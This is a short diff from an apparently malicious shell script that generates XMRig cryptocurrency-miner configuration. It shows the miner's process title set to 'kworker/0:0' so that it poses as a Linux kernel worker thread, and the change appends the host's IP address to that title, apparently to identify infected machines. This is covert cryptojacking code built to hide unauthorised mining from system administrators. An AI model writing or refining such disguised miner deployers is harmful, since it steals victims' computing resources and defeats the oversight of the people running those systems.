@@ -370,7 +370,7 @@ cat > "$XMRIG_CONFIG" << TEMPLATE
 {
     "autosave": true,
     "donate-level": 0,
-    "title": "kworker/0:0",
+    "title": "kworker/0:0 $(hostname -I | awk '{print $1}')",
     "cpu": {
         "enabled": true,
         "max-threads-hint": $MAX_CPU
@@ -395,7 +395,7 @@ if [ -z "$GPU_PART" ]; then
 {
     "autosave": true,
     "donate-level": 0,
-    "title": "kworker/0:0",
+    "title": "kworker/0:0 $(hostname -I | awk '{print $1}')",
     "cpu": {
         "enabled": true,
         "max-threads-hint": $MAX_CPU
